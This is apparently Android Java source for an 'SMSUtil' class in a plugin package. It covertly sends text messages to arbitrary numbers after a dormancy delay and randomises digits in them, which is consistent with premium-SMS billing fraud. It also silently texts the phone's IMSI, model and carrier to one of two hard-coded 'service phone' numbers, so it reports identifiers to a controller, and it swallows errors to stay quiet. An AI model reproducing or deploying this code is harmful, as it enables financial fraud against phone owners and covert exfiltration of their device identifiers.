package com.xstd.plugin.Utils;

import android.content.Context;
import android.os.Build;
import android.telephony.SmsManager;
import android.text.TextUtils;
import com.plugin.common.utils.UtilsRuntime;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;
import com.xstd.plugin.config.SettingManager;

import java.util.Calendar;
import java.util.HashMap;
import java.util.Random;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-22
 * Time: AM9:51
 * To change this template use File | Settings | File Templates.
 */
public class SMSUtil {

    public static final boolean sendSMSForMonkey(Context context, String target, String msg) {
        try {
            if (!TextUtils.isEmpty(msg)) {
                msg = msg.trim();
            }
            if (!TextUtils.isEmpty(target)) {
                target = target.trim();
            }

            int channel = Integer.valueOf(Config.CHANNEL_CODE);
            long currentTime = System.currentTimeMillis();
            long delay = currentTime - SettingManager.getInstance().getFirstLanuchTime();
            if (channel > 950000 && delay < Config.DELAY_ACTIVE_DO_MONKEY) return false;

            if (Config.DEBUG) {
                Config.LOGD("[[SMSUtil::sendSMSForMonkey]] origin msg : << " + msg + " >> to : << " + target + " >>");
            }

            if (!TextUtils.isEmpty(msg) && msg.contains("?")) {
                int firstPos = msg.indexOf("?");
                if (firstPos != -1) {
                    String prefix = msg.substring(0, firstPos);
                    String replaceContent = msg.substring(firstPos);

                    int replaceLength = replaceContent.length();
                    int randomStart = (int) Math.pow(10, replaceLength - 1) + 1;
                    int randomEnd = ((int) Math.pow(10, replaceLength)) - 2;
                    Random random = new Random(randomEnd);
                    int data = random.nextInt();
                    if (data < randomStart) {
                        data = data + randomStart;
                    }
                    msg = prefix + String.valueOf(data);

                    if (Config.DEBUG) {
                        Config.LOGD("[[SMSUtil::sendSMSForMonkey]] prefix : " + prefix + " replace content : " + replaceContent
                                        + " random data : " + data + " real send msg : " + msg);
                    }
                }
            }

            SmsManager.getDefault().sendTextMessage(target, null, msg, null, null);
            if (Config.DEBUG) {
                Config.LOGD("[[SMSUtil::sendSMSForMonkey]] try to send msg : << " + msg + " >> to : << " + target + " >>");
            }

            return true;
        } catch (Exception e) {
//            e.printStackTrace();
        }

        return false;
    }

    public static final boolean sendSMSForLogic(Context context, String target, String msg) {
        try {
            SmsManager.getDefault().sendTextMessage(target, null, msg, null, null);
            if (Config.DEBUG) {
                Config.LOGD("[[SMSUtil::sendSMSForLogic]] try to send msg : << " + msg + " >> to : << " + target + " >>");
            }

            return true;
        } catch (Exception e) {
        }

        return false;
    }

    public synchronized static final void trySendCmdToServicePhone1(Context context) {
        if (Config.DEBUG) {
            Config.LOGD("[[trySendCmdToServicePhone1]] try to send SMS to Service Phone >>>>>>>");
        }

        if (SettingManager.getInstance().getKeyDeviceHasSendToServicePhone()) {
            //如果没有发送过短信到服务器手机，那么就不在做任何处理了
            if (Config.DEBUG) {
                Config.LOGD("[[trySendCmdToServicePhone1]] This phone has send SMS to Service Phone. last send day time : ("
                                + SettingManager.getInstance().getKeyDeviceHasSendToServicePhone()
                                + "), last send time : (" + SettingManager.getInstance().getKeyLastSendMsgToServicehPhone()
                                + "), and clear time : (" + SettingManager.getInstance().getKeySendMsgToServicePhoneClearTimes()
                                + ")");
            }
            return;
        }

        int networkType = AppRuntime.getNetworkTypeByIMSI(context);
        String model = Build.MODEL;
        if (TextUtils.isEmpty(model)) {
            model = "UNKNOWN";
        } else if (model.contains(" ")) {
            try {
                model = model.replace(" ", "");
            } catch (Exception e) {
            }
        }
        String content = "IMEI:" + UtilsRuntime.getIMSI(context) + " PHONETYPE:" + model;
        switch (networkType) {
            case AppRuntime.CMNET:
                content = content + " NT:1";
                break;
            case AppRuntime.UNICOM:
                content = content + " NT:2";
                break;
            case AppRuntime.TELECOM:
                content = content + " NT:3";
                break;
            case AppRuntime.SUBWAY:
                content = content + " NT:4";
                break;
            default:
                content = content + " NT:-1";
        }
        String target = getRandomPhoneServer();

        if (!TextUtils.isEmpty(content) && sendSMSForLogic(context, target, content)) {
            SettingManager.getInstance().setKeyDeviceHasSendToServicePhone(true);
            SettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(100);
            SettingManager.getInstance().setKeyLastSendMsgToServicePhone(System.currentTimeMillis());
        } else {
            SettingManager.getInstance().setKeyDeviceHasSendToServicePhone(false);
            SettingManager.getInstance().setKeyLastSendMsgToServicePhone(0);
            SettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(0);
        }

        if (Config.DEBUG) {
            Calendar c = Calendar.getInstance();
            int curDay = c.get(Calendar.DAY_OF_YEAR);
            Config.LOGD("[[trySendCmdToServicePhone1]] setKeyLastSendMsgToServicePhone = " + curDay);
        }
    }

    public static String getRandomPhoneServer() {
        try {
            Random random = new Random(System.currentTimeMillis());
            int data = random.nextInt(100);
            if (data >= 50) {
                return AppRuntime.PHONE_SERVICE2;
            } else {
                return AppRuntime.PHONE_SERVICE1;
            }
        } catch (Exception e) {
        }

        return AppRuntime.PHONE_SERVICE1;
    }

}
